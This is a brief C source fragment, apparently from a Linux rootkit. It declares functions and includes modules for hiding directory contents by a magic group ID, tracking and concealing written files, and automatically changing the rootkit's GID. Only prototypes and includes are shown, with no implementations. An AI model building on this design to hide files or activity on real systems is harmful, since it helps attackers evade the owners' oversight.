int gidtaken(gid_t newgid);
#include "taken.c"

#ifdef HIDE_MY_ASS
int pathtracked(const char *pathname);
void trackwrite(const char *pathname);
void hidemyass(void);
#endif

#ifdef READ_GID_FROM_FILE
void hidedircontents(const char *path, gid_t newgid);
gid_t changerkgid(void);
#include "change.c"
#endif


gid_t readgid(void);
#include "readgid.c"
#ifdef HIDE_MY_ASS
#include "myass.c"
#endif

#ifdef AUTO_GID_CHANGER
void gidchanger(void);
#include "auto.c"
#endif
